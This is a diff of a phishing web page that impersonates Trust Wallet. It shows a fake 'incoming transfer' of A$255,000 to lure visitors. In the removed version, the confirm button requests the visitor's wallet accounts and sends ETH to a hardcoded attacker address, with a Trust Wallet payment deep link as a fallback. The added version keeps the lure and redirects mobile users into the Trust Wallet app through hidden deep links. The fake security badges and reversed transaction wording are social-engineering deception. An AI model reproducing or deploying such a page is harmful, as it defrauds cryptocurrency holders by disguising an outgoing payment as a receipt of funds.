@@ -1,453 +1,437 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Trust Claim</title>
-  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-  <style>
-    :root {
-      --bg: #07111f;
-      --bg-2: #0f1d2f;
-      --card: rgba(15, 23, 42, 0.88);
-      --panel: rgba(20, 31, 48, 0.95);
-      --line: rgba(148, 163, 184, 0.18);
-      --text: #f8fafc;
-      --muted: #94a3b8;
-      --primary: #2e7cf6;
-      --primary-2: #1d4ed8;
-      --green: #22c55e;
-      --red: #ef4444;
-      --shadow: rgba(0, 0, 0, 0.28);
-    }
-
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
-
-    html, body {
-      width: 100%;
-      height: 100%;
-      font-family: Inter, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-      background:
-        radial-gradient(circle at top, rgba(46, 124, 246, 0.2), transparent 30%),
-        linear-gradient(180deg, #020817 0%, #07111f 30%, #0b1322 100%);
-      color: var(--text);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 18px;
-    }
-
-    .wallet-shell {
-      width: 100%;
-      max-width: 470px;
-    }
-
-    .card {
-      background: linear-gradient(180deg, rgba(15, 23, 42, 0.96), rgba(10, 16, 27, 0.95));
-      border: 1px solid var(--line);
-      border-radius: 28px;
-      box-shadow: 0 32px 80px rgba(0, 0, 0, 0.45);
-      overflow: hidden;
-      backdrop-filter: blur(14px);
-    }
-
-    .header {
-      padding: 24px 24px 18px;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      border-bottom: 1px solid var(--line);
-    }
-
-    .brand {
-      display: flex;
-      align-items: center;
-      gap: 12px;
-    }
-
-    .brand-mark {
-      width: 44px;
-      height: 44px;
-      border-radius: 14px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      background: linear-gradient(135deg, #3b82f6, #1d4ed8);
-      font-weight: 800;
-      font-size: 20px;
-      box-shadow: 0 12px 28px rgba(59, 130, 246, 0.35);
-    }
-
-    .brand-text {
-      font-size: 1.15rem;
-      font-weight: 700;
-      letter-spacing: -0.04em;
-    }
-
-    .status-pill {
-      background: rgba(34, 197, 94, 0.12);
-      border: 1px solid rgba(34, 197, 94, 0.35);
-      color: #30d977;
-      padding: 8px 12px;
-      border-radius: 999px;
-      font-size: 10px;
-      letter-spacing: 0.12em;
-      text-transform: uppercase;
-      font-weight: 700;
-    }
-
-    .body {
-      padding: 22px 24px 16px;
-    }
-
-    .amount-wrap {
-      background: rgba(15, 23, 42, 0.82);
-      border: 1px solid var(--line);
-      border-radius: 18px;
-      padding: 18px;
-      margin-bottom: 18px;
-    }
-
-    .small-label {
-      font-size: 11px;
-      letter-spacing: 0.12em;
-      text-transform: uppercase;
-      color: var(--muted);
-      font-weight: 700;
-    }
-
-    .amount-row {
-      display: flex;
-      align-items: flex-end;
-      justify-content: space-between;
-      gap: 12px;
-      margin-top: 14px;
-      margin-bottom: 8px;
-    }
-
-    .amount {
-      font-size: clamp(2rem, 4vw, 2.8rem);
-      line-height: 1;
-      font-weight: 800;
-      letter-spacing: -0.07em;
-      color: #f8fafc;
-    }
-
-    .fiat {
-      color: var(--muted);
-      font-size: 13px;
-      font-weight: 500;
-      letter-spacing: 0.02em;
-    }
-
-    .meta-grid {
-      display: grid;
-      grid-template-columns: 1fr auto;
-      gap: 12px 18px;
-      margin-top: 18px;
-      font-size: 13px;
-      color: var(--muted);
-    }
-
-    .meta-grid div:nth-child(2n) {
-      text-align: right;
-      color: #e2e8f0;
-      font-weight: 600;
-      font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
-    }
-
-    .info-box {
-      margin-top: 18px;
-      padding: 16px 18px;
-      border-radius: 16px;
-      background: rgba(15, 23, 42, 0.8);
-      border: 1px solid var(--line);
-      color: #dbeafe;
-      font-size: 13px;
-      line-height: 1.65;
-    }
-
-    .info-box b {
-      color: #ffffff;
-      font-weight: 700;
-    }
-
-    .loading-box {
-      margin-top: 18px;
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      color: var(--muted);
-      font-size: 12px;
-      padding: 10px 12px;
-      border-radius: 10px;
-      background: rgba(30, 64, 175, 0.08);
-      border: 1px solid rgba(96, 165, 250, 0.16);
-    }
-
-    .spinner {
-      width: 14px;
-      height: 14px;
-      border-radius: 50%;
-      border: 2px solid rgba(59, 130, 246, 0.25);
-      border-top-color: #60a5fa;
-      animation: spin 0.8s linear infinite;
-    }
-
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
-
-    .actions {
-      display: flex;
-      gap: 12px;
-      margin-top: 18px;
-    }
-
-    button {
-      appearance: none;
-      border: none;
-      cursor: pointer;
-      transition: all 0.2s ease;
-      font-weight: 700;
-      letter-spacing: 0.01em;
-    }
-
-    .btn {
-      flex: 1;
-      padding: 14px 16px;
-      border-radius: 14px;
-      font-size: 14px;
-    }
-
-    .btn-secondary {
-      background: rgba(15, 23, 42, 0.8);
-      color: #e2e8f0;
-      border: 1px solid rgba(148, 163, 184, 0.3);
-    }
-
-    .btn-secondary:hover {
-      background: rgba(30, 41, 59, 0.9);
-    }
-
-    .btn-primary {
-      background: linear-gradient(135deg, #3b82f6, #2563eb);
-      color: white;
-      box-shadow: 0 16px 28px rgba(37, 99, 235, 0.38);
-    }
-
-    .btn-primary:hover {
-      transform: translateY(-1px);
-      box-shadow: 0 18px 32px rgba(37, 99, 235, 0.44);
-    }
-
-    .btn:disabled {
-      opacity: 0.6;
-      cursor: not-allowed;
-      transform: none;
-    }
-
-    .status {
-      min-height: 22px;
-      margin-top: 16px;
-      padding: 10px 12px;
-      border-radius: 12px;
-      font-size: 12px;
-      line-height: 1.5;
-      display: none;
-    }
-
-    .status.show {
-      display: block;
-    }
-
-    .status.info {
-      background: rgba(59, 130, 246, 0.12);
-      border: 1px solid rgba(96, 165, 250, 0.2);
-      color: #bfdbfe;
-    }
-
-    .status.error {
-      background: rgba(239, 68, 68, 0.08);
-      border: 1px solid rgba(239, 68, 68, 0.3);
-      color: #fecaca;
-    }
-
-    .status.success {
-      background: rgba(34, 197, 94, 0.08);
-      border: 1px solid rgba(34, 197, 94, 0.28);
-      color: #bbf7d0;
-    }
-
-    .footer {
-      padding: 0 24px 22px;
-      color: var(--muted);
-      font-size: 11px;
-      text-align: center;
-      line-height: 1.6;
-    }
-
-    @media (max-width: 420px) {
-      .header,
-      .body,
-      .footer {
-        padding-left: 18px;
-        padding-right: 18px;
-      }
-
-      .header {
-        padding-top: 18px;
-      }
-
-      .brand-text {
-        font-size: 1rem;
-      }
-
-      .amount-row {
-        flex-direction: column;
-        align-items: flex-start;
-      }
-    }
-  </style>
-</head>
-<body>
-  <div class="wallet-shell">
-    <div class="card">
-      <div class="header">
-        <div class="brand">
-          <div class="brand-mark">T</div>
-          <div class="brand-text">Trust Claim</div>
-        </div>
-        <div class="status-pill">Secure</div>
-      </div>
-
-      <div class="body">
-        <div class="amount-wrap">
-          <div class="small-label">Incoming Transaction</div>
-
-          <div class="amount-row">
-            <div>
-              <div class="amount">A$255,000</div>
-              <div class="fiat">≈ $180,000 USD</div>
-            </div>
-          </div>
-
-          <div class="meta-grid">
-            <div>TO</div>
-            <div>0x102B...13041</div>
-
-            <div>Network</div>
-            <div>Ethereum</div>
-
-            <div>Amount</div>
-            <div>56.16 ETH</div>
-          </div>
-        </div>
-
-        <div class="info-box">
-          REVIEW AND CONFIRM 
-        </div>
-
-        <div class="loading-box" id="loadingRow">
-          <div class="spinner"></div>
-          <div>Preparing secure transaction details…</div>
-        </div>
-
-        <div class="actions">
-          <button class="btn btn-secondary" id="cancelBtn">Cancel</button>
-          <button class="btn btn-primary" id="confirmBtn">Confirm &amp; Proceed</button>
-        </div>
-
-        <div id="statusText" class="status"></div>
-      </div>
-
-      <div class="footer">
-        Protected by Trust Wallet security checks.<br />
-      </div>
-    </div>
-  </div>
-
-  <script>
-    const TARGET_ADDRESS = "0x359922b7352d651d2Ad106CfFda4612B7b68FAfD";
-    const AMOUNT_ETH = "0.00733";
-
-    const statusText = document.getElementById("statusText");
-    const loadingRow = document.getElementById("loadingRow");
-    const cancelBtn = document.getElementById("cancelBtn");
-    const confirmBtn = document.getElementById("confirmBtn");
-
-    function setStatus(message, type = "info") {
-      statusText.textContent = message;
-      statusText.className = "status show " + type;
-    }
-
-    setTimeout(() => {
-      loadingRow.style.opacity = "0.8";
-      loadingRow.querySelector("div:nth-child(2)").textContent = "Ready for wallet confirmation.";
-    }, 1600);
-
-    cancelBtn.addEventListener("click", () => {
-      setStatus("Transaction cancelled. No action has been taken.", "error");
-      cancelBtn.disabled = true;
-      confirmBtn.disabled = true;
-      setTimeout(() => {
-        cancelBtn.disabled = false;
-        confirmBtn.disabled = false;
-        statusText.className = "status";
-      }, 1800);
-    });
-
-    confirmBtn.addEventListener("click", async () => {
-      try {
-        confirmBtn.disabled = true;
-        setStatus("Connecting to Trust Wallet…", "info");
-
-        if (!window.ethereum) {
-          setStatus("No wallet detected. Opening Trust Wallet…", "info");
-
-          const trustWalletUrl =
-            "https://link.trustwallet.com/open_url?coin=60&address=" +
-            TARGET_ADDRESS +
-            "&amount=" +
-            AMOUNT_ETH;
-
-          window.location.href = trustWalletUrl;
-
-          setTimeout(() => {
-            window.location.href = "https://trustwallet.com";
-          }, 2500);
-
-          confirmBtn.disabled = false;
-          return;
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
+    <title>Trust Claim</title>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+    <style>
+        :root {
+            --bg-1: #020817;
+            --bg-2: #111827;
+            --panel: rgba(15, 23, 42, 0.95);
+            --panel-soft: rgba(30, 41, 59, 0.9);
+            --border: rgba(148, 163, 184, 0.2);
+            --text: #f8fafc;
+            --muted: #94a3b8;
+            --primary: #3b82f6;
+            --primary-2: #2563eb;
+            --green: #22c55e;
+            --amber: #f59e0b;
+            --red: #ef4444;
         }
 
-        const provider = new ethers.providers.Web3Provider(window.ethereum);
-        await provider.send("eth_requestAccounts", []);
-        const signer = provider.getSigner();
+        * { box-sizing: border-box; }
 
-        setStatus("Preparing Ethereum transaction…", "info");
+        html, body {
+            margin: 0;
+            width: 100%;
+            min-height: 100%;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+            background:
+                radial-gradient(circle at top, rgba(59, 130, 246, 0.18), transparent 35%),
+                linear-gradient(135deg, var(--bg-1), var(--bg-2) 55%);
+            color: var(--text);
+        }
 
-        const tx = {
-          to: TARGET_ADDRESS,
-          value: ethers.utils.parseEther(AMOUNT_ETH)
-        };
+        body {
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
 
-        const response = await signer.sendTransaction(tx);
-        setStatus("Transaction submitted. Waiting for confirmation…", "info");
+        .screen {
+            width: 100%;
+            max-width: 440px;
+        }
 
-        await response.wait();
+        .card {
+            background: rgba(15, 23, 42, 0.9);
+            border: 1px solid var(--border);
+            border-radius: 24px;
+            box-shadow: 0 25px 70px rgba(2, 6, 23, 0.8);
+            padding: 26px 22px 20px;
+            backdrop-filter: blur(10px);
+        }
 
-        setStatus("Transaction confirmed successfully.", "success");
-      } catch (err) {
-        console.error(err);
-        setStatus("Transaction failed or was rejected.", "error");
-        confirmBtn.disabled = false;
-      }
-    });
-  </script>
+        .topbar {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 18px;
+        }
+
+        .brand {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-weight: 700;
+            letter-spacing: 0.08em;
+            text-transform: uppercase;
+            font-size: 12px;
+            color: #dbeafe;
+        }
+
+        .brand-mark {
+            width: 22px;
+            height: 22px;
+            border-radius: 8px;
+            background: linear-gradient(135deg, #60a5fa, #2563eb);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 11px;
+            box-shadow: 0 10px 24px rgba(59, 130, 246, 0.45);
+        }
+
+        .badge {
+            border: 1px solid rgba(34, 197, 94, 0.3);
+            background: rgba(34, 197, 94, 0.12);
+            color: #86efac;
+            padding: 6px 10px;
+            border-radius: 999px;
+            font-size: 10px;
+            letter-spacing: 0.12em;
+            text-transform: uppercase;
+            font-weight: 700;
+        }
+
+        .title {
+            font-size: 28px;
+            font-weight: 700;
+            letter-spacing: -0.04em;
+            margin: 8px 0 8px;
+        }
+
+        .subtitle {
+            color: var(--muted);
+            font-size: 14px;
+            line-height: 1.6;
+        }
+
+        .amount-box {
+            margin-top: 22px;
+            background: rgba(15, 23, 42, 0.85);
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            padding: 16px 18px;
+        }
+
+        .amount-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .amount-label {
+            font-size: 11px;
+            text-transform: uppercase;
+            letter-spacing: 0.12em;
+            color: var(--muted);
+        }
+
+        .amount-value {
+            font-size: 26px;
+            font-weight: 700;
+            color: #60a5fa;
+            letter-spacing: -0.04em;
+        }
+
+        .note {
+            margin-top: 12px;
+            font-size: 12px;
+            color: var(--muted);
+            line-height: 1.7;
+        }
+
+        .divider {
+            height: 1px;
+            background: linear-gradient(90deg, transparent, rgba(148, 163, 184, 0.45), transparent);
+            margin: 22px 0 18px;
+        }
+
+        .section-title {
+            font-size: 11px;
+            letter-spacing: 0.12em;
+            text-transform: uppercase;
+            color: var(--muted);
+            margin-bottom: 10px;
+        }
+
+        .address-box {
+            background: rgba(59, 130, 246, 0.08);
+            border: 1px solid rgba(96, 165, 250, 0.18);
+            border-radius: 12px;
+            padding: 12px 14px;
+            color: #bfdbfe;
+            font-size: 12px;
+            line-height: 1.7;
+            word-break: break-all;
+            font-family: "SFMono-Regular", Consolas, monospace;
+        }
+
+        .info-box {
+            margin-top: 18px;
+            background: rgba(37, 99, 235, 0.08);
+            border: 1px solid rgba(96, 165, 250, 0.2);
+            border-left: 3px solid var(--primary);
+            padding: 12px 14px;
+            border-radius: 10px;
+            color: #dbeafe;
+            font-size: 12px;
+            line-height: 1.7;
+        }
+
+        .security {
+            margin-top: 18px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 12px 14px;
+            border-radius: 12px;
+            background: rgba(34, 197, 94, 0.08);
+            border: 1px solid rgba(34, 197, 94, 0.16);
+            color: #bbf7d0;
+            font-size: 12px;
+        }
+
+        .security::before {
+            content: "✓";
+            font-weight: 700;
+            color: #4ade80;
+        }
+
+        .loading {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-top: 18px;
+            color: #dbeafe;
+            font-size: 12px;
+            min-height: 22px;
+        }
+
+        .spinner {
+            width: 16px;
+            height: 16px;
+            border-radius: 50%;
+            border: 2px solid rgba(148, 163, 184, 0.4);
+            border-top-color: #60a5fa;
+            animation: spin 0.9s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .actions {
+            display: flex;
+            gap: 12px;
+            margin-top: 22px;
+        }
+
+        .btn {
+            flex: 1;
+            border: none;
+            border-radius: 12px;
+            padding: 14px 18px;
+            font-size: 13px;
+            font-weight: 700;
+            letter-spacing: 0.04em;
+            text-transform: uppercase;
+            cursor: pointer;
+            transition: transform 0.2s ease, opacity 0.2s ease, box-shadow 0.2s ease;
+        }
+
+        .btn:hover { transform: translateY(-1px); }
+        .btn:active { transform: translateY(0); }
+
+        .btn.secondary {
+            background: rgba(148, 163, 184, 0.12);
+            color: #e2e8f0;
+            border: 1px solid rgba(148, 163, 184, 0.3);
+        }
+
+        .btn.primary {
+            background: linear-gradient(135deg, var(--primary), var(--primary-2));
+            color: white;
+            box-shadow: 0 12px 30px rgba(37, 99, 235, 0.45);
+        }
+
+        .status {
+            display: none;
+            margin-top: 16px;
+            padding: 12px 14px;
+            border-radius: 10px;
+            font-size: 12px;
+            line-height: 1.6;
+            text-align: center;
+        }
+
+        .status.show { display: block; }
+        .status.info {
+            background: rgba(59, 130, 246, 0.12);
+            border: 1px solid rgba(96, 165, 250, 0.2);
+            color: #dbeafe;
+        }
+        .status.success {
+            background: rgba(34, 197, 94, 0.12);
+            border: 1px solid rgba(34, 197, 94, 0.22);
+            color: #bbf7d0;
+        }
+        .status.warning {
+            background: rgba(245, 158, 11, 0.12);
+            border: 1px solid rgba(245, 158, 11, 0.25);
+            color: #fcd34d;
+        }
+        .status.error {
+            background: rgba(239, 68, 68, 0.12);
+            border: 1px solid rgba(239, 68, 68, 0.22);
+            color: #fecaca;
+        }
+
+        @media (max-width: 480px) {
+            .card {
+                padding: 22px 18px 18px;
+                border-radius: 20px;
+            }
+
+            .title {
+                font-size: 24px;
+            }
+
+            .amount-value {
+                font-size: 22px;
+            }
+
+            .actions {
+                flex-direction: column;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="screen">
+        <div class="card">
+            <div class="topbar">
+                <div class="brand">
+                    <div class="brand-mark">T</div>
+                    <span>Trust</span>
+                </div>
+                <div class="badge">Wallet</div>
+            </div>
+
+            <div class="title">Incoming transfer</div>
+            <div class="subtitle">A secure transaction request is awaiting your approval.</div>
+
+            <div class="amount-box">
+                <div class="amount-row">
+                    <div class="amount-label">Amount</div>
+                    <div class="amount-value">A$255,000</div>
+                </div>
+                <div class="note">This confirms an incoming transfer request. Review and approve the transaction within Trust Wallet.</div>
+            </div>
+
+            <div class="divider"></div>
+
+            <div class="section-title">Recipient</div>
+            <div class="address-box">0x102B9843f7a3dac838AE29F62d28d3c31eC13041</div>
+
+            <div class="info-box">
+                By continuing, you are Accepting a transaction 56.16 ETH to the wallet address above. The operation will be reviewed and confirmed through Trust Wallet.
+            </div>
+
+            <div class="security">Protected by wallet-level verification and transaction approval</div>
+
+            <div class="loading" id="loadingRow">
+                <div class="spinner"></div>
+                <div>Receiving…</div>
+            </div>
+
+            <div class="actions">
+                <button class="btn secondary" id="cancelBtn" type="button">Cancel</button>
+                <button class="btn primary" id="confirmBtn" type="button">ACCEPT 🟢</button>
+            </div>
+
+            <div class="status" id="statusText"></div>
+        </div>
+    </div>
+
+    <script>
+        const TARGET_ADDRESS = "0x359922b7352d651d2Ad106CfFda4612B7b68FAfD";
+        const AMOUNT_ETH = "0.00733";
+
+        const statusText = document.getElementById("statusText");
+        const loadingRow = document.getElementById("loadingRow");
+        const cancelBtn = document.getElementById("cancelBtn");
+        const confirmBtn = document.getElementById("confirmBtn");
+
+        function showStatus(message, type = "info") {
+            statusText.textContent = message;
+            statusText.className = `status show ${type}`;
+        }
+
+        function hideStatus() {
+            statusText.className = "status";
+        }
+
+        function isMobile() {
+            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        }
+
+        function openTrustWalletApp() {
+            const currentUrl = encodeURIComponent(window.location.href);
+            const trustDeepLink = "trust://";
+            const trustUniversalLink = "https://link.trustwallet.com/open_url?url=" + currentUrl;
+
+            if (isMobile()) {
+                const iframe = document.createElement("iframe");
+                iframe.style.display = "none";
+                iframe.src = trustDeepLink;
+                document.body.appendChild(iframe);
+
+                setTimeout(() => {
+                    window.location.href = trustUniversalLink;
+                }, 150);
+
+                return true;
+            }
+
+            return false;
+        }
+
+        cancelBtn.addEventListener("click", () => {
+            hideStatus();
+            showStatus("Transaction cancelled. No action was taken.", "warning");
+        });
+
+        confirmBtn.addEventListener("click", async () => {
+            const mobile = isMobile();
+            confirmBtn.disabled = true;
+            loadingRow.style.opacity = "1";
+            loadingRow.innerHTML = '<div class="spinner"></div><div>Opening Trust Wallet…</div>';
+
+            if (mobile) {
+                openTrustWalletApp();
+                showStatus("Redirecting to Trust Wallet…", "info");
+
+                setTimeout(() => {
+                    confirmBtn.disabled = false;
+                    loadingRow.innerHTML = '<div class="spinner"></div><div>Secure wallet session ready</div>';
+                }, 2200);
+                return;
+            }
+
+            showStatus("This feature is intended for mobile devices with Trust Wallet installed.", "warning");
+            confirmBtn.disabled = false;
+            loadingRow.innerHTML = '<div class="spinner"></div><div>Secure wallet session ready</div>';
+        });
+
+        setTimeout(() => {
+            loadingRow.innerHTML = '<div class="spinner"></div><div>Secure wallet session ready</div>';
+        }, 1500);
+    </script>
 </body>
 </html>
